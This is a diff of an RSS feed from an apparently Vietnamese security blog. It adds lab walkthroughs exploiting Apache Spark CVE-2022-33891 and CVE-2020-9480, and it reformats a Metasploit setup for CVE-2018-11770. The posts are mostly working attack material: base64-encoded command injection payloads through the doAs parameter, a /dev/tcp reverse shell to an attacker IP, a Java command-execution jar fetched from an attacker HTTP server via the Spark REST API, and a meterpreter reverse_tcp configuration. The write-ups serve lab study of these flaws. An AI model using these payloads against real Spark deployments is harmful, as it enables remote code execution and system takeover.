@@ -3,7 +3,146 @@
         <title>CVEs - Category - Tu dep trai</title>
         <link>https://g03m0n.github.io/categories/cves/</link>
         <description>CVEs - Category - Tu dep trai</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 20 Nov 2023 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/cves/" rel="self" type="application/rss+xml" /><item>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/cves/" rel="self" type="application/rss+xml" /><item>
+    <title>CVE-2022-33891</title>
+    <link>https://g03m0n.github.io/posts/cve-2022-33891/cve-2022-33891/</link>
+    <pubDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2022-33891/cve-2022-33891/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>Apache Spark UI cho phép kích hoạt tính năng danh sách điều khiển truy cập (ACL) thông qua tùy chọn cấu hình <code>spark.acls.enable</code>.
+Trong đó tồn tại một bộ lọc xác thực có chức năng kiểm tra xem người dùng có quyền truy cập để xem hoặc sửa đổi ứng dụng hay không. Nếu ACL được bật, một đường dẫn mã trong <code>HttpSecurityFilter</code> có thể cho phép hacker thực hiện hành vi mạo danh bằng cách cung cấp tên người dùng tùy ý. Với cấu hình <code>spark.acls.enable</code> <code>true</code> sẽ kích hoạt lỗi chèn lệnh tùy ý. Đoạn mã này có nhiệm vụ kiểm tra quyền của người dùng bằng cách sử dụng lệnh bash shell kết hợp với lệnh unix id. Đoạn mã tồn tại lỗi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#a6e22e">def</span> <span style="color:#a6e22e">getUnixGroups</span>(<span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">String</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">Set</span>[<span style="color:#a6e22e">String</span>] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">val</span> <span style="color:#a6e22e">cmdSeq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Seq</span>(<span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;id -Gn &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">username</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// we need to get rid of the trailing &#34;\n&#34; from the result of command execution
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span><span style="color:#a6e22e">executeAndGetOutput</span>(<span style="color:#a6e22e">cmdSeq</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">stripLineEnd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34; &#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">toSet</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span><span style="color:#a6e22e">executeAndGetOutput</span>(<span style="color:#a6e22e">idPath</span> <span style="color:#f92672">::</span>  <span style="color:#e6db74">&#34;-Gn&#34;</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">Nil</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">stripLineEnd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34; &#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">toSet</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>Hacker có thể khai thác bằng cách thiết lập một lệnh bash shell trong tham số <code>?doAs</code>
+<code>http://&lt;spark-ip&gt;:8080/?doAs={OS_command}</code>
+Tham số <code>doAs</code> trong Apache Spark cho phép người dùng chạy một lệnh với tư cách là người dùng khác. Tham số này có thể được sử dụng để cấp cho người dùng các quyền đặc biệt, chẳng hạn như quyền truy cập vào các tài nguyên hệ thống hoặc dữ liệu nhạy cảm.
+Các lệnh của được xử lý thông qua tham số <code>?doAs</code> và không có gì được phản ánh lại trên trang trong quá trình thực thi lệnh, vì vậy đây là một lỗi <code>Blind OS command injection</code>.</p>
+<h3 id="goal">Goal</h3>
+<p>Khai thác lỗ hổng CVE-2022-33891 thông qua Apache Spark UI, gửi một reverse shell lên server và RCE.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Bước 1:</strong> Vào trong máy ảo docker và chỉnh sửa file <code>conf/spark-defaults.conf</code> bằng dòng lệnh:
+<code>echo &quot;spark.acls.enable true&quot; &gt;&gt; conf/spark-defaults.conf</code></p>
+<p></p>
+<p><strong>Bước 2:</strong> Đây là giao diện chính của Spark Master.</p>
+<p></p>
+<p><strong>Bước 3:</strong> Ta thử lần lượt từng payload.</p>
+<p><code>echo &quot;d2hvYW1p&quot; | base64 -d | bash</code> (tương đương với <code>whoami</code>)
+<code>echo &quot;c2xlZXAgMTAK&quot; | base64 -d | bash</code> (tương đương với <code>sleep 10</code>)</p>
+<p></p>
+<p>Nhận thấy các lệnh của được xử lý thông qua tham số <code>?doAs</code> và không có gì được phản ánh lại trên trang trong quá trình thực thi lệnh, vì vậy đây là một lỗi <code>Blind OS command injection</code>.</p>
+<p><strong>Bước 4:</strong> Tiến hành khai thác bằng PHP reverse shell.</p>
+<p>Mở một port trên máy attacker bằng lệnh <code>ncat -nvlp 9001</code></p>
+<p></p>
+<p>Tiến hành reverse với dòng lệnh:
+<code>echo &quot;c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjM5LzkwMDEgMD4mMQ==&quot; | base64 -d | bash</code> (tương đương với <code>sh -i &gt;&amp; /dev/tcp/192.168.1.39/9001 0&gt;&amp;1</code>)</p>
+<p></p>
+<p><strong>Bước 5:</strong> Reverse thành công.</p>
+<p></p>
+<p><strong>Bước 6:</strong> Khai thác thành công.</p>
+<p></p>
+]]></description>
+</item>
+<item>
+    <title>CVE-2020-9480</title>
+    <link>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</link>
+    <pubDate>Tue, 21 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>Lỗ hổng phát sinh khi tính năng xác thực chính (<code>spark.authenticate</code>) được bật bằng cách sử dụng shared secret. Thông thường, tính năng này yêu cầu người dùng cung cấp <code>shared secret</code> để khởi động tài nguyên của ứng dụng trên Spark <code>cluster</code>. Tuy nhiên, lệnh gọi thủ tục từ xa (RPC) có thể bỏ qua quá trình xác thực và bắt đầu thực thi lệnh thành công, ngay cả khi không có <code>shared secret</code>.
+Kẻ tấn công có thể khai thác lỗ hổng bảo mật này để thực thi từ xa các lệnh shell tùy ý trên máy chủ nơi Spark <code>cluster</code> đang chạy. Bằng cách tận dụng lỗ hổng bảo mật, kẻ tấn công có thể truy cập và kiểm soát trái phép toàn bộ <code>cluster</code>, có khả năng dẫn đến đánh cắp dữ liệu, xâm phạm hệ thống hoặc khai thác mạng thêm.
+Lỗ hổng xảy ra ở chế độ <code>standalone</code> khi xác thực quyền bị bỏ qua, dẫn đến RCE.</p>
+<h3 id="goal">Goal</h3>
+<p>Khai thác lỗ hổng CVE-2020-9840 thông qua REST API dẫn đến thực thi dòng lệnh từ xa.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Bước 1:</strong> Khởi chạy máy ảo Docker bằng câu lệnh <code>docker-compose up</code>:</p>
+<p></p>
+<p>Đây là giao diện chính của Spark Worker:</p>
+<p></p>
+<p><strong>Bước 2:</strong> Tạo một file exploit viết bằng java và lưu với tên <code>Exploit.java</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.BufferedReader;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStreamReader;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> cmds <span style="color:#f92672">=</span> args<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;,&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String cmd : cmds) {
+</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(cmd);
+</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(executeCommand(cmd.<span style="color:#a6e22e">trim</span>()));
+</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;==============================================&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">executeCommand</span>(String command) {
+</span></span><span style="display:flex;"><span>    StringBuilder output <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>      Process p <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(command);
+</span></span><span style="display:flex;"><span>      p.<span style="color:#a6e22e">waitFor</span>();
+</span></span><span style="display:flex;"><span>      BufferedReader reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader(<span style="color:#66d9ef">new</span> InputStreamReader(p.<span style="color:#a6e22e">getInputStream</span>()));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      String line;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ((line <span style="color:#f92672">=</span> reader.<span style="color:#a6e22e">readLine</span>()) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        output.<span style="color:#a6e22e">append</span>(line).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>      e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>javac .<span style="color:#960050;background-color:#1e0010">\</span>Exploit.<span style="color:#a6e22e">jar</span>
+</span></span><span style="display:flex;"><span>jar <span style="color:#f92672">-</span>cvf Exploit.<span style="color:#a6e22e">jar</span> Exploit.<span style="color:#a6e22e">java</span>
+</span></span></code></pre></div><p></p>
+<p><strong>Bước 4:</strong> Khởi tạo máy chủ local để đẩy file <code>Exploit.jar</code> lên server với câu lệnh <code>python -m http.server</code></p>
+<p></p>
+<p><strong>Bước 5:</strong> Ở chế độ <code>standalone</code>, máy chủ sẽ khởi động máy chủ HTTP trên cổng 6066 và chúng ta sẽ gửi API REST tới cổng này:</p>
+<pre tabindex="0"><code>POST /v1/submissions/create HTTP/1.1
+Host: 192.168.1.39:6066
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Content-Type: application/json
+Connection: close
+Content-Length: 680
+
+{
+  &#34;action&#34;: &#34;CreateSubmissionRequest&#34;,
+  &#34;clientSparkVersion&#34;: &#34;2.3.1&#34;,
+  &#34;appArgs&#34;: [
+    &#34;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&#34;
+  ],
+  &#34;appResource&#34;: &#34;http://192.168.1.39:8000/Exploit.jar&#34;,
+  &#34;environmentVariables&#34;: {
+    &#34;SPARK_ENV_LOADED&#34;: &#34;1&#34;
+  },
+  &#34;mainClass&#34;: &#34;Exploit&#34;,
+  &#34;sparkProperties&#34;: {
+    &#34;spark.jars&#34;: &#34;http://192.168.1.39:8000/Exploit.jar &#34;,
+    &#34;spark.driver.supervise&#34;: &#34;false&#34;,
+    &#34;spark.app.name&#34;: &#34;Exploit&#34;,
+    &#34;spark.eventLog.enabled&#34;: &#34;true&#34;,
+    &#34;spark.submit.deployMode&#34;: &#34;cluster&#34;,
+    &#34;spark.master&#34;: &#34;spark://192.168.1.39:6066&#34;
+  }
+}
+</code></pre><p>Trong đó, <code>spark.jars</code> là ứng dụng được biên dịch, <code>mainClass</code> là lớp sẽ được chạy và <code>appArgs</code> là các tham số được truyền cho ứng dụng.</p>
+<p></p>
+<p>Bước 5: Có <code>submitId</code> trong gói tin <code>Reponses</code>, ta vào đường dẫn sau để xem kết quả được thực thi:</p>
+<p><code>http://192.168.1.39:8081/logPage/?driverId={submissionId}&amp;logType=stdout</code></p>
+<p></p>
+]]></description>
+</item>
+<item>
     <title>CVE-2018-11770</title>
     <link>https://g03m0n.github.io/posts/cve-2018-11770/cve-2018-11770/</link>
     <pubDate>Mon, 20 Nov 2023 08:29:01 &#43;0800</pubDate>
@@ -26,12 +165,12 @@ Từ phiên bản 1.3.0 trở đi, <code>Spark's standalone</code> master cung c
 <p><strong>Bước 4:</strong> Sử dụng câu lệnh <code>show options</code> chúng ta có thể thấy có rất nhiều lựa chọn</p>
 <p></p>
 <p><strong>Bước 5:</strong> Tại đây chúng ta sẽ thiết lập IP cho ``RHOST<code>, </code>LHOST` và tìm những payload phù hợp để tấn công vào máy mục tiêu:</p>
-<pre tabindex="0"><code>    set RHOSTS 192.168.1.39 
-    set RPORT 6066 
-    set LHOST 192.168.1.39
-    set LPORT 5555	
-    set payload java/meterpreter/reverse_tcp
-</code></pre><p></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RHOSTS</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1.39</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RPORT</span> <span style="color:#ae81ff">6066</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">LHOST</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1.39</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">LPORT</span> <span style="color:#ae81ff">5555</span>	
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">java</span><span style="color:#f92672">/</span><span style="color:#a6e22e">meterpreter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">reverse_tcp</span>
+</span></span></code></pre></div><p></p>
 <p><strong>Bước 6:</strong> Các thiết lập cho việc khai thác máy mục tiêu bằng <code>metasploit</code> đã hoàn thành thực hiện câu lệnh <code>exploit</code> để khai thác.</p>
 <p></p>
 <p><strong>Bước 7:</strong> Khai thác thành công</p>
